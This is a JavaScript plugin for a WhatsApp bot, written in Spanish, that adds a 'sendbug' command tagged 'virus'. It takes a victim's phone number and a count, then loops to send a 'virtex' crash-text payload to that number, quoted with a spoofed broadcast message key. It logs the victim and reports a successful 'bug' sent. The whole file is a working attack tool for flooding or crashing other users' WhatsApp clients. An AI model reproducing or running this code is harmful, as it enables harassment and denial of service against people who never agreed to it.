//By https://github.com/DIEGO-OFC

import virtex from "../virtex/index.js";

let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
    if (!(isOwner || isPrems)) {
        global.dfail('premium', m, conn)
        throw false
    }
    if (!text) throw `[❕] uhm... ¿quién quiere atacar?\n ejemplo de uso:\n *${usedPrefix + command}* número\n ejemplo: *${usedPrefix + command}* +57*******`;
    let [orang, jumlah] = text.split(',')
    if (!jumlah) throw '.\n\n[❕] introduce la cantidad\n.sbug +38999999999...., 10'
    m.reply('_Procesando..._')
    let who
    try {
        if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        else who = orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (who.length <= 20) throw '*[❕] Responder o etiquetar a las personas que quieren ser atacadas!*';
        conn.logger.info(`\nVictima: ${who}\nCantidad: ${jumlah}`)
        for (let i = jumlah; i > 1; i--) {
            if (i !== 0) await conn.sendMessage(who, { text: virtex }, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: '0@s.whatsapp.net@broadcast'
                    },
                    message: {
                        conversation: virtex
                    }
                }
            })
        }
        conn.reply(m.chat, `[❕] enviando con éxito un bug a @${who.split('@')[0]}`, m, { mentions: [who] })
    } catch (e) {
        console.error(e)
        throw e
    }
}
handler.help = ['sendbug', 'sbug'].map(v => v + ' <nomor>')
handler.tags = ['virus']
handler.command = /^s(end)?bug$/i

handler.premium = false
handler.owner = true

export default handler








